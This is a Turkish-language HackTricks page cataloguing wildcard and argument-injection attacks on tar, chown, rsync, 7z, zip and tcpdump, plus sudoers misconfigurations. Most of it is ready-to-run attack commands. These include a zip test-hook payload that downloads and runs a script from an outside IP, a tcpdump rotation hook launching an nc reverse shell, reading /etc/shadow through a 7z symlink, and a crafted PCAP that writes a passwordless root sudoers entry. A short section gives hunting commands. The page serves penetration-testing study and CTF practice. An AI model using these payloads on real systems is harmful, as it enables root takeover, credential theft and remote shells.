# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** meydana gelir; ayrıcalıklı bir script, `*` gibi tırnaksız bir wildcard ile `tar`, `chown`, `rsync`, `zip`, `7z`, … gibi bir Unix binary çalıştırdığında ortaya çıkar.
> Shell, wildcard’ı binary’yi çalıştırmadan **önce** genişlettiği için, çalışma dizininde dosya oluşturabilen bir saldırgan, `-` ile başlayan dosya adları üretebilir; böylece bunlar **veri yerine option** olarak yorumlanır ve fiilen keyfi flag’ler veya hatta komutlar kaçırılabilir.
> Bu sayfa, 2023-2025 için en kullanışlı primitive’leri, güncel araştırmaları ve modern tespitleri toplar.

## chown / chmod

`--reference` flag’ini kötüye kullanarak **rastgele bir dosyanın owner/group bilgisini veya permission bitlerini kopyalayabilirsiniz**:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Root daha sonra buna benzer bir şey çalıştırdığında:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` enjekte edilir, bu da *tüm* eşleşen dosyaların sahipliğini/izinlerini `/root/secret``file` dosyasından devralmasına neden olur.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
Ayrıntılar için klasik DefenseCode paper'a da bakın.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** özelliğini kötüye kullanarak keyfi komutlar çalıştırın:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Bir kez root örn. `tar -czf /root/backup.tgz *` çalıştırdığında, `shell.sh` root olarak çalıştırılır.

### bsdtar / macOS 14+

Son macOS sürümlerindeki varsayılan `tar` (`libarchive` tabanlı) `--checkpoint` uygulamaz, ancak yine de dış bir sıkıştırıcı belirtmene izin veren **--use-compress-program** bayrağı ile code-execution elde edebilirsin.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Bir ayrıcalıklı script `tar -cf backup.tar *` çalıştırdığında, `/bin/sh` başlatılacaktır.

---

## rsync

`rsync`, `-e` veya `--rsync-path` ile başlayan command-line flags üzerinden remote shell’i veya hatta remote binary’yi override etmenize izin verir:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Eğer root daha sonra dizini `rsync -az * backup:/srv/` ile arşivlerse, enjekte edilen flag uzak tarafta shell’ini açar.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Yetkili script wildcard’ı *defansif olarak* `--` ile öne eklese bile (option parsing’i durdurmak için), 7-Zip formatı dosya adının önüne `@` koyarak **file list files** desteği sunar. Bunu bir symlink ile birleştirmek, *arbitrary files* sızdırmanı sağlar:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Eğer root şöyle bir şey çalıştırırsa:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip, `root.txt` dosyasını (→ `/etc/shadow`) bir file listesi olarak okumaya çalışır ve başarısız olur, içeriği **stderr**'e basar.

Bu, `-- *` ile de çalışır; çünkü 7-Zip CLI, hem normal filename’leri hem de `@listfiles`’ı positional input olarak açıkça kabul eder, bu yüzden `@root.txt` gibi bir literal filename yine özel olarak işlenir.

---

## zip

Bir application, user-controlled filename’leri `zip`’e aktardığında (ister wildcard aracılığıyla ister `--` olmadan name’leri enumerate ederek) iki çok pratik primitive vardır.

- test hook üzerinden RCE: `-T` “test archive” özelliğini etkinleştirir ve `-TT <cmd>` tester’ı arbitrary bir program ile değiştirir (uzun biçim: `--unzip-command <cmd>`). `-` ile başlayan filename’ler inject edebiliyorsanız, short-options parsing çalışsın diye flag’leri ayrı filename’lere bölün:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notlar
- Tek bir dosya adı gibi `'-T -TT <cmd>'` denemeyin — kısa seçenekler karakter başına ayrıştırılır ve başarısız olur. Gösterildiği gibi ayrı token’lar kullanın.
- Eğer uygulama tarafından dosya adlarından slash’ler kaldırılıyorsa, çıplak bir host/IP’den çekin (varsayılan yol `/index.html`) ve `-O` ile yerel olarak kaydedin, sonra execute edin.
- Token’larınızın nasıl tüketildiğini anlamak için ayrıştırmayı `-sc` (işlenmiş argv’yi göster) veya `-h2` (daha fazla yardım) ile debug edebilirsiniz.

Örnek (zip 3.0 üzerinde local davranış):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Eğer web katmanı `zip` stdout/stderr çıktısını yankılıyorsa (naive wrapper’larda yaygın), `--help` gibi enjekte edilmiş flag’ler veya kötü option’lardan kaynaklanan hatalar HTTP yanıtında görünür; bu da command-line injection’ı doğrular ve payload ayarlamaya yardımcı olur.

---

## Wildcard injection’a duyarlı ek binaries (2023-2025 hızlı liste)

Aşağıdaki commands modern CTF’lerde ve gerçek ortamlarda kötüye kullanıldı.  Payload her zaman daha sonra wildcard ile işlenecek writable bir directory içinde bir *filename* olarak oluşturulur:

| Binary | Kötüye kullanılacak flag | Etki |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | File contents oku |
| `flock` | `-c <cmd>` | Command execute et |
| `git`   | `-c core.sshCommand=<cmd>` | SSH üzerinden git ile command execution |
| `scp`   | `-S <cmd>` | ssh yerine arbitrary program başlat |

Bu primitives, *tar/rsync/zip* klasiklerine göre daha az yaygındır ama hunting yaparken kontrol etmeye değer.

---

## Vulnerable wrappers ve jobs için hunting

Son case study’ler, wildcard/argv injection’ın artık sadece bir **cron + tar** problemi olmadığını gösterdi. Aynı bug class şuralarda da tekrar tekrar ortaya çıkıyor:

- attacker-controlled upload directories’ten "her şeyi zip/tar olarak indir" yapan web özellikleri
- attacker-controlled filename/filter alanlarıyla **tcpdump** wrapper açığa çıkaran vendor/appliance debug shells
- writable directories üzerinde `tar`, `rsync`, `7z`, `zip`, `chown` veya `chmod` çağıran backup ya da rotation jobs

Faydalı triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Hızlı heuristics:

- `-- *`, birçok GNU araç için iyi bir düzeltmedir, ancak `7z`/`7za` için değildir çünkü `@listfiles` ayrı şekilde parse edilir.
- `zip` için, kullanıcı kontrollü dosya adlarını doğrudan enumerate eden wrappers arayın; kısa seçenek ayrıştırma (`-T` + `-TT <cmd>`) shell glob olmadan da çalışır.
- `tcpdump` için, özellikle **output file names**, **rotation settings** veya **capture-file replay** argümanlarını kontrol etmenize izin veren wrappers’a dikkat edin.

---

## tcpdump rotation hooks (-G/-W/-z): wrappers içinde argv injection ile RCE

Kısıtlı bir shell veya vendor wrapper, kullanıcı kontrollü alanları (ör. bir "file name" parametresi) sıkı quoting/validation olmadan birleştirerek bir `tcpdump` command line oluşturduğunda, ekstra `tcpdump` flags kaçırabilirsiniz. `-G` (time-based rotation), `-W` (file sayısı sınırı) ve `-z <cmd>` (post-rotate command) kombinasyonu, tcpdump çalıştıran user olarak keyfi command execution sağlar (appliance’larda çoğunlukla root).

Ön koşullar:

- `tcpdump`'a iletilen `argv`'yi etkileyebilirsiniz (ör. `/debug/tcpdump --filter=... --file-name=<HERE>` gibi bir wrapper üzerinden).
- Wrapper, file name alanındaki boşlukları veya `-` ile başlayan token’ları sanitize etmez.

Klasik PoC (yazılabilir bir path’ten reverse shell script çalıştırır):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detaylar:

- `-G 1 -W 1` ilk eşleşen paketten sonra hemen bir rotate zorlar.
- `-z <cmd>` post-rotate komutunu her rotation için bir kez çalıştırır. Birçok build `<cmd> <savefile>` çalıştırır. Eğer `<cmd>` bir script/interpreter ise, argüman işleme biçiminin payload’inizle uyuştuğundan emin olun.

No-removable-media varyantları:

- Dosya yazmak için başka bir primitive’iniz varsa (ör. output redirection’a izin veren ayrı bir command wrapper), script’inizi bilinen bir path’e bırakın ve platform semantics’ine bağlı olarak `-z /bin/sh /path/script.sh` veya `-z /path/script.sh` tetikleyin.
- Bazı vendor wrapper’lar attacker-controllable location’lara rotate eder. Rotated path’i etkileyebiliyorsanız (symlink/directory traversal), dış media olmadan tamamen kontrol ettiğiniz içeriği çalıştıracak şekilde `-z`’yi yönlendirebilirsiniz.

---

## sudoers: wildcard’larla/additional args ile tcpdump → arbitrary write/read ve root

Çok yaygın sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Sorunlar
- `*` glob ve esnek kalıplar yalnızca ilk `-w` argümanını kısıtlar. `tcpdump` birden fazla `-w` seçeneğini kabul eder; sonuncusu geçerlidir.
- Kural diğer seçenekleri sabitlemez, bu yüzden `-Z`, `-r`, `-V`, vb. izinlidir.

Primitive'ler
- İkinci bir `-w` ile hedef yolu geçersiz kılın (ilk yalnızca sudoers'ı karşılar):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Kısıtlı ağaçtan çıkmak için ilk `-w` içinde path traversal:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root` ile çıktı sahipliğini zorla (her yerde root-owned dosyalar oluşturur):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r` ile hazırlanmış bir PCAP’i yeniden oynatarak keyfi içerik yazma (örn. bir sudoers satırı bırakmak için):

<details>
<summary>Exact ASCII payload içeren ve onu root olarak yazan bir PCAP oluşturun</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>` ile arbitrary file read/secret leak (savefiles listesini yorumlar). Hata teşhisleri çoğu zaman satırları yankılar, bu da içeriğin leak olmasına neden olur:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
